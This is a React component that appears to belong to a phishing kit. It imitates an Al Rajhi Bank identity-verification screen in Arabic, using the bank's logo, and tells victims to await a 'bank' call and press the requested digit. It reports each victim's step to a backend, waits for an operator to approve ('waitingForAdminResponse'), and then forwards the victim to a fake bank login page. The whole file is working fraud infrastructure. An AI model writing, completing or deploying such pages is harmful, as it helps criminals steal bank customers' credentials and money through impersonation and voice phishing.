import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  isFormApproved,
  navigateToPage,
} from "@/lib/store";

export default function AlRajhiCall() {
  const [, navigate] = useLocation();
  const [callReceived, setCallReceived] = useState(false);

  // Emit page enter
  useEffect(() => {
    navigateToPage("إتصال الراجحى");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/alrajhi-login");
    }
  }, [isFormApproved.value, navigate]);

  const handleCallReceived = () => {
    setCallReceived(true);
    sendData({
      data: { الحالة: "تم تلقي المكالمة" },
      current: "إتصال الراجحى",
      nextPage: "تسجيل الدخول الراجحى",
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="al-rajhi">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-[#004d7a]/10 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
            <svg
              className="w-10 h-10 text-[#004d7a]"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">انتظر المكالمة</h1>
          <p className="text-gray-500 text-sm">
            ستصلك مكالمة من مصرف الراجحي للتحقق من هويتك
          </p>
        </div>

        {/* Bank Logo */}
        <div className="flex justify-center mb-6">
          <img
            src="/images/banks/al-rajhi-banking-and-investment-corp.png"
            alt="الراجحي"
            className="h-16"
          />
        </div>

        {/* Instructions */}
        <div className="bg-blue-50 rounded-lg p-4 mb-6">
          <h3 className="font-semibold text-blue-800 mb-2">تعليمات هامة:</h3>
          <ul className="text-sm text-blue-700 space-y-1 list-disc list-inside">
            <li>انتظر المكالمة الواردة من مصرف الراجحي</li>
            <li>اتبع التعليمات الصوتية</li>
            <li>اضغط على الرقم المطلوب للتأكيد</li>
          </ul>
        </div>

        {/* Phone Animation */}
        {!callReceived && (
          <div className="flex justify-center mb-6">
            <div className="relative">
              <img
                src="/images/phone-ringing.png"
                alt="Phone Ringing"
                className="w-24 h-24 animate-bounce"
              />
            </div>
          </div>
        )}

        {/* Button */}
        <Button
          onClick={handleCallReceived}
          className="w-full bg-[#004d7a] hover:bg-[#003d5c]"
          size="lg"
          disabled={callReceived}
        >
          {callReceived ? "جاري التحقق..." : "تم استلام المكالمة"}
        </Button>
      </div>
    </PageLayout>
  );
}
